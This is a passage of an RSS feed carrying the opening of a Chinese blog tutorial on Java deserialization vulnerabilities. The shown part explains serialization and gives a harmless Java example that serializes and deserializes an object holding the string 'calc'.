&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>小伙伴们可能会很迷茫，这要何从下手？&lt;/p></description></item><item><title>Java 反序列化漏洞原理（一）Serializable</title><link>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</link><pubDate>Thu, 14 Oct 2021 23:00:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/java-serialization-vulnerability-1/</guid><description>&lt;h2 id="声明">声明&lt;/h2>
&lt;p>本文章中所有内容仅供学习交流，严禁用于非法用途，否则由此产生的一切后果均与作者无关。&lt;/p>
&lt;h2 id="序列化的定义">序列化的定义&lt;/h2>
&lt;p>序列化是指将数据结构或对象状态转换成可取用格式，以留待后续在相同或另一台计算机环境中，能恢复原先状态的过程。依照序列化格式重新获取字节的结果时，可以利用它来产生与原始对象相同语义的副本。&lt;/p>
&lt;h2 id="java-中的序列化">Java 中的序列化&lt;/h2>
&lt;p>Java 自身提供了序列化的功能，需要实现 &lt;code>java.io.Serializable&lt;/code> 接口，标明该对象是可序列化的。 &lt;code>java.io.Serializable&lt;/code> 是一个空接口，不需要对象实现方法。&lt;/p>
&lt;p>以下面这段代码为例，展示了一个对象的序列化和反序列化的过程。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.io.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.nio.charset.StandardCharsets;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">import&lt;/span> java.util.Base64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Eval0&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">class&lt;/span> &lt;span style="color:#50fa7b">Command&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">implements&lt;/span> Serializable {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">private&lt;/span> String cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> String &lt;span style="color:#50fa7b">getCmd&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">return&lt;/span> cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">setCmd&lt;/span>(String cmd) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">this&lt;/span>.&lt;span style="color:#50fa7b">cmd&lt;/span> &lt;span style="color:#ff79c6">=&lt;/span> cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">public&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">static&lt;/span> &lt;span style="color:#8be9fd">void&lt;/span> &lt;span style="color:#50fa7b">main&lt;/span>(String&lt;span style="color:#ff79c6">[]&lt;/span> args) &lt;span style="color:#8be9fd;font-style:italic">throws&lt;/span> Exception {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 定义一个对象&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Command command &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> Command();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> command.&lt;span style="color:#50fa7b">setCmd&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;calc&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;序列化前: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> command.&lt;span style="color:#50fa7b">getCmd&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将用户序列化为字节数组&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayOutputStream buffer &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ByteArrayOutputStream();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> (ObjectOutputStream outputStream &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectOutputStream(buffer)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> outputStream.&lt;span style="color:#50fa7b">writeObject&lt;/span>(command);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> String data &lt;span style="color:#ff79c6">=&lt;/span> Base64.&lt;span style="color:#50fa7b">getEncoder&lt;/span>().&lt;span style="color:#50fa7b">encodeToString&lt;/span>(buffer.&lt;span style="color:#50fa7b">toByteArray&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;序列化后: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> data);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将base64编码的数据再解码为字节数组&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> &lt;span style="color:#8be9fd">byte&lt;/span>&lt;span style="color:#ff79c6">[]&lt;/span> bytes &lt;span style="color:#ff79c6">=&lt;/span> Base64.&lt;span style="color:#50fa7b">getDecoder&lt;/span>().&lt;span style="color:#50fa7b">decode&lt;/span>(data.&lt;span style="color:#50fa7b">getBytes&lt;/span>(StandardCharsets.&lt;span style="color:#50fa7b">UTF_8&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">// 将字节数组反序列化为对象&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ByteArrayInputStream b &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ByteArrayInputStream(bytes);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">try&lt;/span> (ObjectInputStream input &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#ff79c6">new&lt;/span> ObjectInputStream(b)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">final&lt;/span> Command obj &lt;span style="color:#ff79c6">=&lt;/span> (Command) input.&lt;span style="color:#50fa7b">readObject&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#50fa7b">out&lt;/span>.&lt;span style="color:#50fa7b">println&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#34;反序列化: &amp;#34;&lt;/span> &lt;span style="color:#ff79c6">+&lt;/span> obj.&lt;span style="color:#50fa7b">getCmd&lt;/span>());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>运行后输出：&lt;/p></description></item></channel></rss>